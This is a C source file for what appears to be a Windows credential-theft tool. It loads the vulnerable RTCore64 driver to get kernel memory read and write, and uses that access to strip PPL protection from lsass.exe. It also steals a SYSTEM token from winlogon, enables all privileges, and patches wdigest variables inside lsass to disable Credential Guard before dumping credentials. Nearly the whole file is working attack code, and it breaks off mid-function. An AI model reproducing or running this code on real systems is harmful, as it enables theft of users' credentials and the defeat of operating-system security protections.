/*

    Author: vari.sh

    Description: - This program impersonates SYSTEM and implements LSASS dump. Creates a log.txt file in C:\Windows\Tasks.
                 - Additionally, it uses primitives to access memory via the RTCore64 driver,
                   and reads the EPROCESS structure of lsass.exe to verify the offsets needed for disabling PPL.
                   It then writes the byte that disables PPL.
                 - Finally it disables Credentials Guard using the approach of https://github.com/ricardojoserf/NativeBypassCredGuard

*/

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <stdio.h>
#include <aclapi.h> 
#include <psapi.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>


// Logs
static FILE* logfile;

// Define the function pointer type for MiniDumpWriteDump
typedef BOOL(WINAPI* PFN_MDWD)(
    HANDLE hProcess,
    DWORD ProcessId,
    HANDLE hFile,
    MINIDUMP_TYPE DumpType,
    PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,
    PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
    PMINIDUMP_CALLBACK_INFORMATION CallbackParam
    );

// =====================================================
// Memory Access Primitives via RTCore64
// =====================================================

typedef struct _RTCORE64_MSR_READ {
    DWORD Register;
    DWORD ValueHigh;
    DWORD ValueLow;
} RTCORE64_MSR_READ;
#if defined(__STDC_VERSION__) && __STDC_VERSION__ >= 201112L
_Static_assert(sizeof(RTCORE64_MSR_READ) == 12, "sizeof RTCORE64_MSR_READ must be 12 bytes");
#endif

typedef struct _RTCORE64_MEMORY_READ {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
} RTCORE64_MEMORY_READ;
#if defined(__STDC_VERSION__) && __STDC_VERSION__ >= 201112L
_Static_assert(sizeof(RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");
#endif

typedef struct _RTCORE64_MEMORY_WRITE {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
} RTCORE64_MEMORY_WRITE;
#if defined(__STDC_VERSION__) && __STDC_VERSION__ >= 201112L
_Static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");
#endif

// IOCTL codes for RTCORE64
static const DWORD RTC64_MSR_READ_CODE = 0x80002030;
static const DWORD RTC64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTC64_MEMORY_WRITE_CODE = 0x8000204c;

DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address) {
    RTCORE64_MEMORY_READ memRead = { 0 };
    memRead.Address = Address;
    memRead.ReadSize = Size;
    DWORD BytesReturned;
    DeviceIoControl(Device,
        RTC64_MEMORY_READ_CODE,
        &memRead,
        sizeof(memRead),
        &memRead,
        sizeof(memRead),
        &BytesReturned,
        NULL);
    return memRead.Value;
}

void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value) {
    RTCORE64_MEMORY_WRITE memWrite = { 0 };
    memWrite.Address = Address;
    memWrite.ReadSize = Size;
    memWrite.Value = Value;
    DWORD BytesReturned;
    DeviceIoControl(Device,
        RTC64_MEMORY_WRITE_CODE,
        &memWrite,
        sizeof(memWrite),
        &memWrite,
        sizeof(memWrite),
        &BytesReturned,
        NULL);
}

WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address) {
    return (WORD)(ReadMemoryPrimitive(Device, 2, Address) & 0xffff);
}

DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 4, Address);
}

DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address) {
    return (((DWORD64)ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
}

void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value) {
    WriteMemoryPrimitive(Device, 4, Address, (DWORD)(Value & 0xffffffff));
    WriteMemoryPrimitive(Device, 4, Address + 4, (DWORD)(Value >> 32));
}

// Helper function to read a memory buffer in 4-byte chunks
BOOL ReadMemoryBuffer(HANDLE Device, DWORD64 Address, void* Buffer, DWORD BufferSize) {
    DWORD numDwords = BufferSize / 4;
    DWORD remainder = BufferSize % 4;
    for (DWORD i = 0; i < numDwords; i++) {
        ((DWORD*)Buffer)[i] = ReadMemoryDWORD(Device, Address + i * 4);
    }
    if (remainder) {
        DWORD value = ReadMemoryPrimitive(Device, remainder, Address + numDwords * 4);
        memcpy((BYTE*)Buffer + numDwords * 4, &value, remainder);
    }
    return TRUE;
}

// =====================================================
// Retrieve the Base Address of ntoskrnl.exe via EnumDeviceDrivers
// =====================================================
unsigned long long getKBAddr() {
    DWORD cbNeeded = 0;
    PVOID* base = NULL;
    if (EnumDeviceDrivers(NULL, 0, &cbNeeded)) {
        base = (PVOID*)malloc(cbNeeded);
        if (base) {
            if (EnumDeviceDrivers(base, cbNeeded, &cbNeeded)) {
                unsigned long long addr = (unsigned long long)base[0];
                free(base);
                return addr;
            }
            free(base);
        }
    }
    return 0;
}

// =====================================================
// OS Version Detection and Offsets setting
// =====================================================

// Structure containing the three useful offsets
typedef struct _Offsets {
    DWORD64 ActiveProcessLinks;  // Offset of the ActiveProcessLinks field in _EPROCESS
    DWORD64 ImageFileName;       // Offset of the ImageFileName field in _EPROCESS
    DWORD64 Protection;          // Offset of the Protection (PS_PROTECTION) field in _EPROCESS
} Offsets;


// Function to get the OS version
int GetOSVersion() {
    wchar_t CurrentBuild[255] = { 0 };
    DWORD bufferSize = sizeof(CurrentBuild);
    LONG ret = RegGetValueW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
        L"CurrentBuild",
        RRF_RT_REG_SZ,
        NULL,
        CurrentBuild,
        &bufferSize
    );
    if (ret == ERROR_SUCCESS) {
        fwprintf(logfile, L"[*] Windows Build %s detected\n", CurrentBuild);
        return _wtoi(CurrentBuild);
    }
    else {
        fwprintf(logfile, L"[ERROR] Unable to retrieve Windows Build. Error code: %ld\n", ret);
        return -1;
    }
}

// Function to get the offsets
Offsets getOffsets() {
    int build = GetOSVersion();

    if (build < 0) {
        exit(-1);
    }

    Offsets offs = { 0, 0, 0 };

    // Offsets table for x64 (TODO)
    if (build <= 14393) {              // Windows 10 version 1607 (Build 14393)
        offs.ActiveProcessLinks = 0x0000;
        offs.ImageFileName = 0x0000;
        offs.Protection = 0x0000;
    }
    else if (build <= 17134) {       // Windows 10 version 1803 (Build 17134)
        offs.ActiveProcessLinks = 0x0000;
        offs.ImageFileName = 0x0000;
        offs.Protection = 0x0000;
    }
    else if (build <= 17763) {       // Windows 10 version 1809 (Build 17763)
        offs.ActiveProcessLinks = 0x0000;
        offs.ImageFileName = 0x0000;
        offs.Protection = 0x0000;
    }
    else if (build <= 18362) {       // Windows 10 version 1903 (Build 18362)
        offs.ActiveProcessLinks = 0x0000;
        offs.ImageFileName = 0x0000;
        offs.Protection = 0x0000;
    }
    else if (build <= 18363) {       // Windows 10 version 1909 (Build 18363)
        offs.ActiveProcessLinks = 0x0000;
        offs.ImageFileName = 0x0000;
        offs.Protection = 0x0000;
    }
    else if (build <= 19045) {       // Windows 10 version 22H2 (Build 19041)
        offs.ActiveProcessLinks = 0x448;
        offs.ImageFileName = 0x5a8;
        offs.Protection = 0x87a;
    }
    else if (build <= 22631) {  // Windows 23H2
        offs.ActiveProcessLinks = 0x448;
        offs.ImageFileName = 0x5a8;
        offs.Protection = 0x87a;
    }
    else if (build > 22631) {  // Windows 11 24H2 and above
        offs.ActiveProcessLinks = 0x1d8;
        offs.ImageFileName = 0x338;
        offs.Protection = 0x5fa;
    }
    else {
        wprintf(L"[ERROR] Offsets not defined for build %d on x64.\n", build);
        exit(1);
    }
    return offs;
}

// =====================================================
// Driver loading and unloading
// =====================================================

// Function to load and start the driver
#define DRIVER_NAME "mDriver"
#define DRIVER_PATH "C:\\Windows\\Tasks\\RTCore64.sys"
#define DEVICE_NAME L"\\\\.\\RTCore64"

// Helper function to open the Service Control Manager with the specified access rights
SC_HANDLE OpenSCManagerHandle(DWORD dwAccess) {
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, dwAccess);
    if (!hSCM) {
        fprintf(logfile, "[ERROR] OpenSCManager failed. Error code: %lu\n", GetLastError());
    }
    return hSCM;
}

// Helper function to create or open the driver service
SC_HANDLE CreateOrOpenDriverService(SC_HANDLE hSCM, const char* driverName, const char* driverPath) {
    SC_HANDLE hService = CreateServiceA(
        hSCM,
        driverName,          // Internal service name
        driverName,          // Display name
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        driverPath,          // Full path to the driver file
        NULL, NULL, NULL, NULL, NULL
    );
    if (!hService) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            hService = OpenServiceA(hSCM, driverName, SERVICE_ALL_ACCESS);
            if (hService) {
                fprintf(logfile, "[+] Existing service opened successfully.\n");
            }
            else {
                fprintf(logfile, "[ERROR] Unable to open the existing service. Error code: %lu\n", GetLastError());
            }
        }
        else if (err == ERROR_SERVICE_MARKED_FOR_DELETE) {
            fprintf(logfile, "[ERROR] Service is marked for deletion.\n");
        }
        else {
            fprintf(logfile, "[ERROR] CreateService error. Error code: %lu\n", err);
        }
    }
    else {
        fprintf(logfile, "[+] Service created successfully.\n");
    }
    return hService;
}

// Function to load and start the driver
int LoadAndStartDriver(void) {
    SC_HANDLE hSCM = OpenSCManagerHandle(SC_MANAGER_CREATE_SERVICE);
    if (!hSCM)
        return 1;

    SC_HANDLE hService = CreateOrOpenDriverService(hSCM, DRIVER_NAME, DRIVER_PATH);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return 1;
    }

    // Start the driver service
    if (!StartServiceA(hService, 0, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            fprintf(logfile, "[ERROR] StartService error. Error code: %lu\n", err);
            DeleteService(hService);
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return 1;
        }
        else {
            fprintf(logfile, "[*] Driver is already loaded.\n");
        }
    }
    else {
        fprintf(logfile, "[+] Driver loaded and started successfully.\n");
    }

    // Close the handles
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return 0;
}

// Function to stop and unload the driver
int StopAndUnloadDriver(const char* driverName) {
    SC_HANDLE hSCM = OpenSCManagerHandle(SC_MANAGER_ALL_ACCESS);
    if (!hSCM)
        return 1;

    SC_HANDLE hService = OpenServiceA(hSCM, driverName, SERVICE_STOP | DELETE | SERVICE_QUERY_STATUS);
    if (!hService) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_DOES_NOT_EXIST) {
            fprintf(logfile, "[ERROR] Service does not exist.\n");
            CloseServiceHandle(hSCM);
            return 0;
        }
        else if (err == ERROR_SERVICE_MARKED_FOR_DELETE) {
            fprintf(logfile, "[*] Service is already marked for deletion.\n");
            CloseServiceHandle(hSCM);
            return 0;
        }
        else {
            fprintf(logfile, "[ERROR] Error: %s.\n", err);
            CloseServiceHandle(hSCM);
            return 0;
        }
        fprintf(logfile, "[ERROR] OpenService failed. Error code: %lu\n", err);
        CloseServiceHandle(hSCM);
        return 1;

    }

    SERVICE_STATUS status;
    if (!ControlService(hService, SERVICE_CONTROL_STOP, &status)) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_NOT_ACTIVE) {
            fprintf(logfile, "[*] The service is not active.\n");
        }
        else {
            fprintf(logfile, "[ERROR] ControlService (stop) failed. Error code: %lu\n", err);
        }
    }
    else {
        fprintf(logfile, "[+] Service stopped successfully.\n");
    }

    // Attempt to delete the service
    if (!DeleteService(hService)) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_MARKED_FOR_DELETE) {
            fprintf(logfile, "[*] Service is already marked for deletion.\n");
        }
        else {
            fprintf(logfile, "[ERROR] DeleteService failed. Error code: %lu\n", err);
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return 1;
        }
    }
    else {
        fprintf(logfile, "[+] Service deleted successfully.\n");
    }

    // Close the handles
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return 0;
}

// =====================================================
// Function to Read the EPROCESS Structure of lsass.exe
// =====================================================

void static disablePPL() {

    Offsets offs = getOffsets();
    if (offs.ActiveProcessLinks == 0 || offs.ImageFileName == 0 || offs.Protection == 0) {
        fprintf(logfile, "[ERROR] Offset not mapped... exiting!\n");
        exit(1);
    }

    HANDLE Device = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (Device == INVALID_HANDLE_VALUE) {
        fprintf(logfile, "[ERROR] Unable to obtain a handle to the device object\n");
        return;
    }
    fprintf(logfile, "[*] Device handle obtained\n");

    unsigned long long ntoskrnlBase = getKBAddr();
    fprintf(logfile, "[*] ntoskrnl.exe base address: 0x%llx\n", ntoskrnlBase);

    HMODULE hNtoskrnl = LoadLibraryW(L"ntoskrnl.exe");
    if (!hNtoskrnl) {
        fprintf(logfile, "[ERROR] Failed to load ntoskrnl.exe\n");
        CloseHandle(Device);
        return;
    }
    // Calculate the offset of the exported variable PsInitialSystemProcess
    DWORD64 PsInitialSystemProcessOffset = (DWORD64)GetProcAddress(hNtoskrnl, "PsInitialSystemProcess") - (DWORD64)hNtoskrnl;
    FreeLibrary(hNtoskrnl);

    // Retrieve the address of the System process's EPROCESS
    DWORD64 SystemProcessEPROCESS = ReadMemoryDWORD64(Device, ntoskrnlBase + PsInitialSystemProcessOffset);
    fprintf(logfile, "[*] PsInitialSystemProcess (EPROCESS) address: 0x%llx\n", SystemProcessEPROCESS);

    // Calculate the list head (located within the EPROCESS)
    DWORD64 ListHead = SystemProcessEPROCESS + offs.ActiveProcessLinks;
    DWORD64 CurrentEntry = ReadMemoryDWORD64(Device, ListHead); // First element of the list

    while (CurrentEntry != ListHead) {
        // The current EPROCESS address is obtained by subtracting the offset from the LIST_ENTRY pointer
        DWORD64 eprocess = CurrentEntry - offs.ActiveProcessLinks;

        // Read the ImageFileName field (15 bytes, as defined in the struct) and add a null terminator
        char imageName[16] = { 0 };
        ReadMemoryBuffer(Device, eprocess + offs.ImageFileName, imageName, 15);
        imageName[15] = '\0';

        if (_stricmp(imageName, "lsass.exe") == 0) {
            fprintf(logfile, "[*] Found EPROCESS at 0x%llx\n", eprocess);
            // Read the protection byte (PPL) from the EPROCESS
            BYTE protection = (BYTE)ReadMemoryPrimitive(Device, 1, eprocess + offs.Protection);
            fprintf(logfile, "[*] Protection value: 0x%02X\n", protection);

            // To disable PPL, write 0x00 into this field.
            // Warning: perform this operation only if you are sure the offsets are correct.
            WriteMemoryPrimitive(Device, 1, eprocess + offs.Protection, 0x00);
            fprintf(logfile, "[+] PPL disabled (0x00 written)\n");

            // Read the protection byte (PPL) from the EPROCESS again
            BYTE protection_post = (BYTE)ReadMemoryPrimitive(Device, 1, eprocess + offs.Protection);
            fprintf(logfile, "[*] Protection value after write: 0x%02X\n", protection_post);

            break;
        }
        // Move to the next element in the list
        CurrentEntry = ReadMemoryDWORD64(Device, CurrentEntry);
    }

    CloseHandle(Device);
}

// =====================================================
// Function to load clean versions of DLLs
// =====================================================
HMODULE LoadCleanDLL(char* dllPath) {

    HMODULE hDLL = LoadLibraryA(dllPath);
    if (hDLL)
    {
        fprintf(logfile, "[+] Loaded clean copy of %s at: %p\n", dllPath, hDLL);
    }
    else
    {
        fprintf(logfile, "[ERROR] Failed to load %s. Error: %lu\n", dllPath, GetLastError());
    }

    return hDLL;
}

// =====================================================
// Function to obtain a SYSTEM token
// =====================================================
BOOL GetSystemTokenAndDuplicate(HANDLE* hSystemToken) {
    PROCESSENTRY32 pe = { 0 };
    pe.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        fprintf(logfile, "CreateToolhelp32Snapshot error: %u\n", GetLastError());
        return FALSE;
    }

    BOOL found = FALSE;
    HANDLE hProcess = NULL;
    HANDLE hToken = NULL;
    HANDLE hDupToken = NULL;

    if (Process32First(hSnapshot, &pe)) {
        do {
            // Look for winlogon
            if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) {
                hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
                if (hProcess) {
                    if (OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
                        if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
                            *hSystemToken = hDupToken;
                            found = TRUE;
                            CloseHandle(hToken);
                            CloseHandle(hProcess);
                            fprintf(logfile, "[+] Successfully duplicated token. Process can now run as SYSTEM.\n");
                            break;
                        }
                        CloseHandle(hToken);
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);

    if (!found) {
        fprintf(logfile, "Failed to obtain system token\n");
        return FALSE;
    }
    return TRUE;
}

// ========================================
// Functions to get all privileges
// ========================================

// Function to enable a specific privilege on the provided token.
// This function does not open the token itself, but uses the token passed as parameter.
BOOL EnablePrivilege(HANDLE hToken, LPCWSTR privilegeName) {
    TOKEN_PRIVILEGES tokenPrivs;
    LUID luid;

    // Lookup the LUID for the specified privilege
    if (!LookupPrivilegeValueW(NULL, privilegeName, &luid)) {
        // wprintf(L"[ERROR] Failed to lookup privilege %ls. Error: %lu\n", privilegeName, GetLastError());
        return FALSE;
    }
    // wprintf(L"[INFO] LUID for privilege %ls retrieved successfully.\n", privilegeName);

    // Set up the TOKEN_PRIVILEGES structure
    tokenPrivs.PrivilegeCount = 1;
    tokenPrivs.Privileges[0].Luid = luid;
    tokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Adjust the token privileges to enable the privilege
    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivs, sizeof(tokenPrivs), NULL, NULL)) {
        // wprintf(L"[ERROR] AdjustTokenPrivileges failed for %ls. Error: %lu\n", privilegeName, GetLastError());
        return FALSE;
    }

    // Check if the privilege was successfully enabled
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        // wprintf(L"[ERROR] The privilege %ls could not be enabled. Not all privileges were assigned.\n", privilegeName);
        return FALSE;
    }

    // wprintf(L"[+] Privilege %ls enabled successfully.\n", privilegeName);
    return TRUE;
}

// Function to enable all desired privileges on the provided token.
void EnableAllPrivileges(HANDLE hToken) {
    // List of privileges to enable
    LPCWSTR privileges[] = {
        SE_BACKUP_NAME,
        SE_CHANGE_NOTIFY_NAME,
        SE_CREATE_GLOBAL_NAME,
        SE_CREATE_PAGEFILE_NAME,
        SE_CREATE_PERMANENT_NAME,
        SE_CREATE_SYMBOLIC_LINK_NAME,
        SE_DEBUG_NAME,
        SE_IMPERSONATE_NAME,
        SE_INC_BASE_PRIORITY_NAME,
        SE_INC_WORKING_SET_NAME,
        SE_LOCK_MEMORY_NAME,
        SE_MACHINE_ACCOUNT_NAME,
        SE_MANAGE_VOLUME_NAME,
        SE_PROF_SINGLE_PROCESS_NAME,
        SE_RESTORE_NAME,
        SE_SHUTDOWN_NAME,
        SE_SYSTEM_ENVIRONMENT_NAME,
        SE_SYSTEM_PROFILE_NAME,
        SE_SYSTEMTIME_NAME,
        SE_TAKE_OWNERSHIP_NAME,
        SE_TCB_NAME,
        SE_TIME_ZONE_NAME,
        SE_TRUSTED_CREDMAN_ACCESS_NAME,
        SE_UNSOLICITED_INPUT_NAME
    };

    int numPrivileges = sizeof(privileges) / sizeof(privileges[0]);
    for (int i = 0; i < numPrivileges; i++) {
        // wprintf(L"Trying to enable privilege: %ls\n", privileges[i]);
        if (!EnablePrivilege(hToken, privileges[i])) {
            // wprintf(L"[ERROR] Failed to enable privilege: %ls\n", privileges[i]);
        }
        else {
            // wprintf(L"[INFO] Privilege enabled: %ls\n", privileges[i]);
        }
    }
}

// ===============================
// Function to get process handle and modules
// ===============================

BOOL GetProcessHandle(IN LPWSTR processName, OUT HANDLE* hProcess, OUT DWORD* pID)
{
    DWORD pid = 0;
    HANDLE hP = NULL;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        fprintf(logfile, "[ERROR] Invalid HANDLE to process snapshots [%d]\n", GetLastError());
        return FALSE;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe))
    {
        fprintf(logfile, "[ERROR] Could not enumerate processes [%d]\n", GetLastError());
        CloseHandle(hSnapshot);
        return FALSE;
    }

    do {
        if (_wcsicmp(processName, pe.szExeFile) == 0)
        {
            pid = pe.th32ProcessID;
            fprintf(logfile, "[*] Trying to open handle on %ls, on PID %d\n", processName, pid);

            hP = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
            if (hP == NULL)
            {
                fprintf(logfile, "[ERROR] Could not open handle on PID %d, Error: %d\n", pid, GetLastError());
            }
            else
            {
                fprintf(logfile, "[+] Successfully got handle on PID %d\n", pid);
                *pID = pid;
                *hProcess = hP;
                CloseHandle(hSnapshot);
                return TRUE;
            }
        }
    } while (Process32Next(hSnapshot, &pe));

    CloseHandle(hSnapshot);
    fprintf(logfile, "[ERROR] Process %ls not found.\n", processName);
    return FALSE;
}


#define MAX_MODULES 1024

// Function to enumerate a process' modules and find the address of 'module.dll'
LPVOID EnumerateModulesAndFindAddress(HANDLE hProcess, const char* moduleName) {
    HMODULE hMods[MAX_MODULES];
    DWORD cbNeeded;
    unsigned int i;

    // Get all the modules of the process
    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        // fprintf(logfile, "Modules loaded in the process:\n");

        // Calculate the number of modules
        unsigned int numModules = cbNeeded / sizeof(HMODULE);

        // Scan all modules
        for (i = 0; i < numModules; i++) {
            char szModName[MAX_PATH];

            // Get the module name
            if (GetModuleFileNameExA(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(char))) {
                // fprintf(logfile, "%d: %s\n", i, szModName);

                // Check if the module is the one being searched for
                if (strstr(szModName, moduleName) != NULL) {
                    MODULEINFO modInfo;
                    if (GetModuleInformation(hProcess, hMods[i], &modInfo, sizeof(modInfo))) {
                        // fprintf(logfile, "Base address of module %s: 0x%p\n", moduleName, modInfo.lpBaseOfDll);
                        return modInfo.lpBaseOfDll;
                    }
                    else {
                        fprintf(logfile, "[ERROR] Unable to get information about module %s.\n", moduleName);
                        return NULL;
                    }
                }
            }
        }
    }
    else {
        fprintf(logfile, "[ERROR] Error enumerating the process modules: %lu\n", GetLastError());
        return NULL;
    }
}

// =====================================================
// Function to Disable credentialGuard
// ===================================================== 

int disableCG() {
    DWORD bytesReadf;
    // Read wdigest.dll from disk
    HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\wdigest.dll", GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        fprintf(logfile, "[ERROR] Unable to open wdigest.dll from disk.\n");
        return 1;
    }
    // Read up to 1 MB
    BYTE* fileBuffer = (BYTE*)malloc(1024 * 1024);
    if (!fileBuffer) {
        CloseHandle(hFile);
        return 1;
    }
    if (!ReadFile(hFile, fileBuffer, 1024 * 1024, &bytesReadf, NULL)) {
        fprintf(logfile, "[ERROR] Error in ReadFile.\n");
        free(fileBuffer);
        CloseHandle(hFile);
        return 1;
    }
    CloseHandle(hFile);

    // Parse the PE file to locate the .text section
    DWORD peOffset = *(DWORD*)(fileBuffer + 0x3C);
    if (*(DWORD*)(fileBuffer + peOffset) != 0x00004550) { // "PE\0\0"
        fprintf(logfile, "[ERROR] Invalid PE signature.\n");
        free(fileBuffer);
        return 1;
    }
    WORD numSections = *(WORD*)(fileBuffer + peOffset + 6);
    WORD sizeOptionalHeader = *(WORD*)(fileBuffer + peOffset + 20);
    int sectionHeadersOffset = peOffset + 24 + sizeOptionalHeader;

    DWORD textVirtualAddress = 0, textRawDataPointer = 0, textRawDataSize = 0;
    for (int i = 0; i < numSections; i++) {
        int secOffset = sectionHeadersOffset + (i * 40); // each header is 40 bytes
        char sectionName[9] = { 0 };
        memcpy(sectionName, fileBuffer + secOffset, 8);
        if (strcmp(sectionName, ".text") == 0) {
            textVirtualAddress = *(DWORD*)(fileBuffer + secOffset + 12);
            textRawDataSize = *(DWORD*)(fileBuffer + secOffset + 16);
            textRawDataPointer = *(DWORD*)(fileBuffer + secOffset + 20);
            break;
        }
    }
    if (textVirtualAddress == 0) {
        fprintf(logfile, "[ERROR] .text section not found.\n");
        free(fileBuffer);
        return 1;
    }

    // --- 3. Search for the pattern in the .text section ---
    // The pattern used here: looking for a sequence where:
    //   byte0 == 0x39, byte5 == 0x00, byte6 == 0x8B, byte11 == 0x00
    // If the pattern is found, extract:
    //   useLogonCredential = (b2 | b3<<8 | b4<<16)
    //   isCredGuardEnabled = (b8 | b9<<8 | b10<<16)
    int patternFound = 0;
    int patternOffset = 0;
    int useLogonVal = 0, credGuardVal = 0;
    for (DWORD j = textRawDataPointer; j < textRawDataPointer + textRawDataSize - 12; j++) {
        if (fileBuffer[j] == 0x39 && fileBuffer[j + 5] == 0x00 &&
            fileBuffer[j + 6] == 0x8B && fileBuffer[j + 11] == 0x00) {
            // The relative offset in the module is: (j - rawDataPointer) + virtualAddress
            patternOffset = (int)(j - textRawDataPointer) + textVirtualAddress;
            useLogonVal = fileBuffer[j + 2] | (fileBuffer[j + 3] << 8) | (fileBuffer[j + 4] << 16);
            credGuardVal = fileBuffer[j + 8] | (fileBuffer[j + 9] << 8) | (fileBuffer[j + 10] << 16);
            patternFound = 1;
            break;
        }
    }
    if (!patternFound) {
        fprintf(logfile, "[ERROR] Pattern not found in PE file.\n");
        return 1;
    }

    fprintf(logfile, "[*] patternOffset = %X - useLogonVal = %X - credGuardVal = %X\n", patternOffset, useLogonVal, credGuardVal);

    // Print the next 12 bytes from the pattern's file offset
    fprintf(logfile, "[*] Next 12 bytes after the pattern start:\n");
    for (int i = 0; i < 12; i++) {
        fprintf(logfile, "%02X ", fileBuffer[patternOffset + i]);
    }
    fprintf(logfile, "\n");

    free(fileBuffer);


    // Compute the final offsets in wdigest.dll
    DWORD useLogonCredentialOffset = useLogonVal + patternOffset + 6;
    DWORD credGuardOffset = credGuardVal + patternOffset + 12;

    // Create a snapshot of active processes
    LPWSTR processName = L"lsass.exe";
    HANDLE hLsass = NULL;
    DWORD pID;

    GetProcessHandle(processName, &hLsass, &pID);


    const char* moduleName = "wdigest.DLL";
    LPVOID wdigestBaseAddress = EnumerateModulesAndFindAddress(hLsass, moduleName);

    // Compute the actual addresses in lsass and patch the values
    LPVOID addrUseLogon = (LPVOID)((uintptr_t)wdigestBaseAddress + useLogonCredentialOffset);
    LPVOID addrCredGuard = (LPVOID)((uintptr_t)wdigestBaseAddress + credGuardOffset);


    fprintf(logfile, "[+] DLL Base Address: \t\t0x%llX\n", (unsigned long long)wdigestBaseAddress);
    fprintf(logfile, "[+] UseLogonCredential address:\t0x%llX (0x%llX + 0x%X)\n", (unsigned long long)addrUseLogon, (unsigned long long)wdigestBaseAddress, useLogonCredentialOffset);
    fprintf(logfile, "[+] IsCredGuardEnabled address:\t0x%llX (0x%llX + 0x%X)\n", (unsigned long long)addrCredGuard, (unsigned long long)wdigestBaseAddress, credGuardOffset);

    fprintf(logfile, "[*] addrUseLogon = %p - addrCredGuard = %p\n", addrUseLogon, addrCredGuard);

    char* ntdllPath = "C:\\Windows\\System32\\ntdll.dll";
    HANDLE hNtdll = LoadCleanDLL(ntdllPath);

    // Declare buffers for reading values
    BYTE useLogonCredential_buffer[4] = { 0 };
    BYTE isCredGuardEnabled_buffer[4] = { 0 };
    SIZE_T bytesRead = 0;
    ULONG bytesWritten = 0;
    DWORD newVal = 0;
    NTSTATUS status;

    typedef NTSTATUS(WINAPI* NtReadVirtualMemoryFn)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    typedef NTSTATUS(WINAPI* NtWriteVirtualMemoryFn)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG BufferSize, PULONG NumberOfBytesWritten);

    NtReadVirtualMemoryFn NtReadVirtualMemory;
    NtWriteVirtualMemoryFn NtWriteVirtualMemory;

    NtReadVirtualMemory = (NtReadVirtualMemoryFn)GetProcAddress(hNtdll, "NtReadVirtualMemory");
    NtWriteVirtualMemory = (NtWriteVirtualMemoryFn)GetProcAddress(hNtdll, "NtWriteVirtualMemory");

    // Read and print current value for g_fParameter_UseLogonCredential using NtReadVirtualMemory
    NTSTATUS ntstatus = NtReadVirtualMemory(hLsass, addrUseLogon, useLogonCredential_buffer, sizeof(useLogonCredential_buffer), &bytesRead);
    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hLsass != NULL) {
        fprintf(logfile, "[ERROR] NtReadVirtualMemory for useLogonCredential failed: 0x%08X\n", ntstatus);
    }
    else {
        fprintf(logfile, "[+] UseLogonCredential value: \t%02X %02X %02X %02X\n",
            useLogonCredential_buffer[0], useLogonCredential_buffer[1],
            useLogonCredential_buffer[2], useLogonCredential_buffer[3]);
    }

